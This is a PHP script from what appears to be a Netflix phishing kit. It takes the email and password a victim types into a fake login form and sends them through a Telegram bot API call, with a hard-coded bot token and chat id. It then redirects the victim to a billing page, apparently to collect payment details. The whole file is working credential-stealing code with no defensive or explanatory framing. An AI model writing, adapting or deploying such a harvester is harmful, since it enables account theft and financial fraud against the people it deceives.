<?php


    $email = $_POST['mail'];
    $pass = $_POST['pass'];

        $tmsg = "---------- Netflix Login ---------\n\r";
        $tmsg .= "Email: $email \n";
        $tmsg .= "Password: $pass \n";
        $tmsg .= "--------------------------------------\n";
        
                    file_get_contents("https://api.telegram.org/bot5759111738:AAHsW7K_NhXMJOk89TYWrwooJYYCsu8k1Xo/sendMessage?chat_id=-896912896&text=" . urlencode($tmsg)."" );
 
        header("Location: ../billing.php");
?>
